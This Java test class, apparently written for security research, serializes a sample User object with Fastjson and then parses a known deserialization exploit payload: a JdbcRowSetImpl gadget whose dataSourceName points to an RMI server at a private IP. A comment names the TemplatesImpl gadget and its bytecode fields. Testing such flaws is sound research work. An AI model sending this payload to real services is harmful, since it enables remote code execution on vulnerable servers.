package com.ksyun.safe.fastjson;


import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonTest {
    public static void main(String[] args) {
        User u = new User();
        u.setName("xxx");
        u.setSex("woman");
        String a = JSONObject.toJSONString(u);
        System.out.println(a);
        String b = JSONObject.toJSONString(u, SerializerFeature.WriteClassName);
        System.out.println(b);
//    com.sun.rowset.JdbcRowSetImpl
        JSONObject.parse("{\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"rmi://192.168.124.14:1099/shit\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}", Feature.SupportNonPublicField);
        // com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
        // 属性： _bytecodes _name _outputProperties _tfactory _version allowedProtocols
    }
}
